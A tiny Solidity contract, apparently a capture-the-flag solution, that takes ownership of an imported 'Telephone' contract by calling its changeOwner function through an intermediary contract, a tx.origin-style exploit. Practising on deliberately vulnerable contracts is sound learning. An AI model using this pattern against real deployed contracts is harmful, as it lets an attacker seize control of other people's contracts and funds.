// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./telephone.sol";

contract TelephoneHacker {

    constructor() public {
    }

    function changeOwner(address _telephone) public {
        Telephone(_telephone).changeOwner(msg.sender);
    }
}